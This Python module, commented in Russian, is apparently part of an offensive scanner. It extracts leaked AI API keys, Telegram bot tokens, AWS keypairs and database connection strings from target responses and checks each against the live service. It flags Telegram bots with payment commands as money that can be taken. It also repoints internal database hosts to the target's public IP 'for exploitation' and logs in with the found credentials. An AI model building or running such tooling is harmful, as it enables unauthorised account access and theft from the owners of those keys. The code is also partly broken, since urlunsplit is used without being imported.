# -*- coding: utf-8 -*-
"""Верификация найденных секретов: AI-ключи, telegram-боты, AWS, DSN.

Все проверки бесплатны и безопасны (без списания средств, read-only).
"""
import asyncio
import re
from typing import Any
from urllib.parse import urlsplit

import aiohttp

# Извлечение ключей по уникальным префиксам провайдеров
KEY_EXTRACTORS: list[tuple[str, re.Pattern[str]]] = [
    ("anthropic", re.compile(r'\bsk-ant-api03-[A-Za-z0-9_-]{20,}')),
    ("openrouter", re.compile(r'\bsk-or-v1-[A-Za-z0-9]{40,}')),
    ("openai", re.compile(r'\bsk-(?:proj|svcacct)-[A-Za-z0-9_-]{40,}')),
    ("openai", re.compile(r'\bsk-[A-Za-z0-9]{48,}')),
    ("groq", re.compile(r'\bgsk_[A-Za-z0-9]{40,}')),
    ("gemini", re.compile(r'\bAIza[0-9A-Za-z_-]{35}')),
    ("huggingface", re.compile(r'\bhf_[A-Za-z0-9]{30,}')),
    ("xai", re.compile(r'\bxai-[A-Za-z0-9]{40,}')),
]

# Бесплатные проверочные эндпоинты (не генерируют токены)
PROVIDER_URLS = {
    "openai": "https://api.openai.com/v1/models",
    "anthropic": "https://api.anthropic.com/v1/models",
    "groq": "https://api.groq.com/openai/v1/models",
    # auth/key - единственный, кто отдаёт реальный баланс (limit/usage)
    "openrouter": "https://openrouter.ai/api/v1/auth/key",
    "huggingface": "https://huggingface.co/api/whoami-v2",
    "xai": "https://api.x.ai/v1/api-key",
}


def extract_ai_keys(text: str) -> list[tuple[str, str]]:
    """Извлекает пары (provider, key) из текста ответа."""
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for provider, rx in KEY_EXTRACTORS:
        for m in rx.finditer(text):
            key = m.group(0)
            if key not in seen:
                seen.add(key)
                found.append((provider, key))
    return found


async def verify_ai_key(
    session: aiohttp.ClientSession,
    provider: str,
    key: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет ключ: valid / invalid / error + детали (баланс, где отдаётся)."""
    result: dict[str, Any] = {
        "provider": provider,
        "key": key,
        "status": "error",
        "detail": "",
    }
    try:
        if provider == "gemini":
            url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
            headers = {}
        else:
            url = PROVIDER_URLS[provider]
            if provider == "anthropic":
                headers = {"x-api-key": key, "anthropic-version": "2023-06-01"}
            else:
                headers = {"Authorization": f"Bearer {key}"}

        timeout = aiohttp.ClientTimeout(total=timeout_s)
        async with session.get(
            url, headers=headers, proxy=proxy, timeout=timeout
        ) as resp:
            if resp.status in (200, 201):
                result["status"] = "valid"
                if provider == "openrouter":
                    try:
                        data = (await resp.json()).get("data", {})
                        limit = data.get("limit")
                        if limit is None:
                            result["detail"] = (
                                f"free_tier={data.get('is_free_tier')} "
                                f"spent={data.get('usage')}"
                            )
                        else:
                            result["detail"] = (
                                f"limit={limit} spent={data.get('usage')} "
                                f"free_tier={data.get('is_free_tier')}"
                            )
                    except Exception:
                        pass
            elif resp.status in (401, 403) or (resp.status == 400 and provider == "gemini"):
                # Gemini отдаёт 400 для невалидных API-ключей
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["status"] = "error"
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# Telegram bot tokens: id:hash
TELEGRAM_BOT_RE = re.compile(r'\b(\d{8,10}):([A-Za-z0-9_-]{35})\b')


def extract_telegram_bots(text: str) -> list[str]:
    """Извлекает токены telegram-ботов из текста ответа."""
    return list(dict.fromkeys(m.group(0) for m in TELEGRAM_BOT_RE.finditer(text)))


# Платёжные команды telegram-бота (EN/RU)
MONEY_COMMAND_RE = re.compile(
    r'(?:pay|payout|withdraw|cash|balance|topup|top_up|deposit|stars|invoice|buy|replenish'
    r'|вывод|баланс|оплата|пополн|выплат|заработ|кошел)',
    re.I,
)


async def verify_telegram_bot(
    session: aiohttp.ClientSession,
    token: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет бота через getMe (бесплатно и безопасно).

    Дополнительно через getMyCommands ищет платёжные команды
    (вывод/баланс/оплата) - признак бот-кассы, с которой можно брать деньги.
    """
    result: dict[str, Any] = {
        "token": token,
        "status": "error",
        "username": "",
        "money": False,
        "money_commands": [],
    }
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    try:
        async with session.get(
            f"https://api.telegram.org/bot{token}/getMe",
            proxy=proxy,
            timeout=timeout,
        ) as resp:
            if resp.status == 200:
                try:
                    data = await resp.json()
                except Exception:
                    data = {}
                if data.get("ok"):
                    result["status"] = "valid"
                    result["username"] = data.get("result", {}).get("username", "")
                else:
                    result["status"] = "invalid"
            elif resp.status in (401, 404):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["status"] = "error"
                result["detail"] = f"HTTP {resp.status}"

        # Живой бот: ищем платёжные команды и описания
        if result["status"] == "valid":
            try:
                money_cmds: list[str] = []
                money_desc: list[str] = []
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getMyCommands",
                    proxy=proxy,
                    timeout=timeout,
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        cmds = data.get("result") or []
                        money_cmds = [
                            c.get("command", "")
                            for c in cmds
                            if MONEY_COMMAND_RE.search(str(c.get("command", "")))
                            or MONEY_COMMAND_RE.search(str(c.get("description", "")))
                        ]
                # Описания бота часто прямо говорят о деньгах (вывод/баланс)
                for meth, field in (
                    ("getMyDescription", "description"),
                    ("getMyShortDescription", "short_description"),
                ):
                    async with session.get(
                        f"https://api.telegram.org/bot{token}/{meth}",
                        proxy=proxy,
                        timeout=timeout,
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            text = str((data.get("result") or {}).get(field) or "")
                            if text and MONEY_COMMAND_RE.search(text):
                                money_desc.append(text[:100])
                result["money_commands"] = money_cmds
                result["money_text"] = money_desc
                result["money"] = bool(money_cmds or money_desc)
            except (aiohttp.ClientError, TimeoutError):
                pass
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# AWS access key IDs (AKIA...)
AWS_KEY_RE = re.compile(r'\b(AKIA[0-9A-Z]{16})\b')


def extract_aws_keys(text: str) -> list[str]:
    """Извлекает AWS access key IDs из текста ответа."""
    return list(dict.fromkeys(AWS_KEY_RE.findall(text)))


# Пары access_key + secret_key в одном JSON-объекте (оба порядка полей)
AWS_KEYPAIR_RE = re.compile(
    r'"(?:aws_access_key_id|access_key_id|aws_access_key)"\s*:\s*"(AKIA[0-9A-Z]{16})"'
    r'[^{}]{0,400}?'
    r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key)"\s*:\s*"([A-Za-z0-9/+=]{40})"',
    re.I,
)
AWS_KEYPAIR_RE_R = re.compile(
    r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key)"\s*:\s*"([A-Za-z0-9/+=]{40})"'
    r'[^{}]{0,400}?'
    r'"(?:aws_access_key_id|access_key_id|aws_access_key)"\s*:\s*"(AKIA[0-9A-Z]{16})"',
    re.I,
)


def extract_aws_keypairs(text: str) -> list[tuple[str, str]]:
    """Извлекает пары (access_key, secret_key) из одного JSON-объекта."""
    pairs = [(m.group(1), m.group(2)) for m in AWS_KEYPAIR_RE.finditer(text)]
    pairs += [(m.group(2), m.group(1)) for m in AWS_KEYPAIR_RE_R.finditer(text)]
    return list(dict.fromkeys(pairs))


def _sigv4_auth(
    access_key: str, secret_key: str, amzdate: str, datestamp: str,
    body: str,
) -> str:
    """Authorization-заголовок SigV4 для POST sts.amazonaws.com (query protocol)."""
    import hashlib
    import hmac as hmac_mod

    def h(key: bytes, msg: str) -> bytes:
        return hmac_mod.new(key, msg.encode(), hashlib.sha256).digest()

    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical_headers = (
        'content-type:application/x-www-form-urlencoded\n'
        'host:sts.amazonaws.com\n'
        f'x-amz-date:{amzdate}\n'
    )
    signed_headers = 'content-type;host;x-amz-date'
    canonical_request = (
        f'POST\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}'
    )
    scope = f'{datestamp}/us-east-1/sts/aws4_request'
    string_to_sign = (
        'AWS4-HMAC-SHA256\n'
        f'{amzdate}\n{scope}\n'
        + hashlib.sha256(canonical_request.encode()).hexdigest()
    )
    k = h(('AWS4' + secret_key).encode(), datestamp)
    k = h(k, 'us-east-1')
    k = h(k, 'sts')
    k = h(k, 'aws4_request')
    signature = hmac_mod.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
    return (
        f'AWS4-HMAC-SHA256 Credential={access_key}/{scope}, '
        f'SignedHeaders={signed_headers}, Signature={signature}'
    )


async def verify_aws_keypair(
    session: aiohttp.ClientSession,
    access_key: str,
    secret_key: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет пару AWS-ключей через STS GetCallerIdentity (SigV4).

    Бесплатно и безопасно: только читает identity (account ID, ARN).
    """
    result: dict[str, Any] = {
        "access_key": access_key, "status": "error",
        "account": "", "arn": "", "detail": "",
    }
    try:
        from datetime import datetime, timezone
        now = datetime.now(timezone.utc)
        amzdate = now.strftime('%Y%m%dT%H%M%SZ')
        datestamp = now.strftime('%Y%m%d')
        body = 'Action=GetCallerIdentity&Version=2011-06-15'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Amz-Date': amzdate,
            'Authorization': _sigv4_auth(access_key, secret_key, amzdate, datestamp, body),
        }
        timeout = aiohttp.ClientTimeout(total=timeout_s)
        async with session.post(
            'https://sts.amazonaws.com/', data=body, headers=headers,
            proxy=proxy, timeout=timeout,
        ) as resp:
            if resp.status == 200:
                text = await resp.text()
                m = re.search(r'<Account>(\d+)</Account>', text)
                arn = re.search(r'<Arn>([^<]+)</Arn>', text)
                if m:
                    result["status"] = "valid"
                    result["account"] = m.group(1)
                    result["arn"] = arn.group(1) if arn else ""
                else:
                    result["detail"] = "no account in response"
            elif resp.status in (400, 401, 403, 404):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# DSN с кредами: postgres/mysql/mongodb/redis/amqp
DSN_RE = re.compile(
    r'\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]+@[^\s"\'<>]+',
    re.I,
)

DSN_DEFAULT_PORTS = {
    "postgresql": 5432, "postgres": 5432,
    "mysql": 3306, "mariadb": 3306,
    "mongodb": 27017, "mongodb+srv": 27017,
    "redis": 6379, "amqp": 5672,
}


def extract_dsns(text: str) -> list[str]:
    """Извлекает DSN с user:pass@ из текста ответа."""
    return list(dict.fromkeys(DSN_RE.findall(text)))


def _effective_dsn_host(host: str, target_host: str | None) -> tuple[str, bool]:
    """Хост для подключения: внутренние (localhost/docker) подменяем на IP цели.

    DSN вида postgres://user:pass@db:5432 виден изнутри контейнера цели -
    снаружи этот же сервис обычно доступен на публичном IP самого хоста.
    """
    h = (host or "").strip().lower()
    if not h:
        return h, False
    internal = (
        h in ("localhost", "::1", "host.docker.internal")
        or h.startswith("127.")
        or "." not in h  # docker service name: db, postgres, redis...
    )
    if not internal:
        try:
            import ipaddress
            ip = ipaddress.ip_address(h)
            internal = ip.is_private or ip.is_loopback or ip.is_link_local
        except ValueError:
            internal = False
    if internal and target_host:
        return target_host, True
    return host, False


async def check_dsn(
    dsn: str, timeout_s: float = 5.0, target_host: str | None = None,
) -> dict[str, Any]:
    """Проверяет DSN: доступен ли хост, работают ли креды (postgres).

    Внутренние хосты (localhost/docker) переподключаются на публичный IP
    цели target_host - там обычно выставлен тот же сервис.
    TCP-коннект идёт напрямую (asyncpg не умеет прокси) - это нормально:
    к найденной БД всё равно придётся подключаться для эксплуатации.
    """
    result: dict[str, Any] = {
        "dsn": dsn, "status": "unreachable", "error": "",
        "connect_host": "", "via": "",
    }
    try:
        u = urlsplit(dsn)
        host = u.hostname or ""
        connect_host, rewritten = _effective_dsn_host(host, target_host)
        result["connect_host"] = connect_host
        result["via"] = target_host if rewritten else ""
        port = u.port or DSN_DEFAULT_PORTS.get(u.scheme.lower(), 0)
        if not connect_host or not port:
            result["error"] = "bad dsn"
            return result

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(connect_host, port), timeout=timeout_s
            )
            writer.close()
            await writer.wait_closed()
        except (OSError, asyncio.TimeoutError) as exc:
            result["error"] = type(exc).__name__
            return result

        # Полная проверка кредов - только postgres (asyncpg уже в зависимостях)
        if u.scheme.lower() in ("postgres", "postgresql") and u.username and u.password:
            # Пересобираем DSN с эффективным хостом (без query)
            auth = u.username
            if u.password is not None:
                auth += ":" + u.password
            new_netloc = f"{auth}@{connect_host}" + (f":{u.port}" if u.port else "")
            clean_dsn = urlunsplit((u.scheme, new_netloc, u.path or "/", "", ""))
            for ssl_arg in (None, False):
                try:
                    import asyncpg
                    conn = await asyncio.wait_for(
                        asyncpg.connect(dsn=clean_dsn, timeout=timeout_s, ssl=ssl_arg),
                        timeout=timeout_s + 2,
                    )
                    await conn.close()
                    result["status"] = "auth_ok"
                    return result
                except Exception as exc:
                    result["error"] = type(exc).__name__
            result["status"] = "reachable"
        else:
            result["status"] = "reachable"
    except Exception as exc:
        result["error"] = type(exc).__name__
    return result
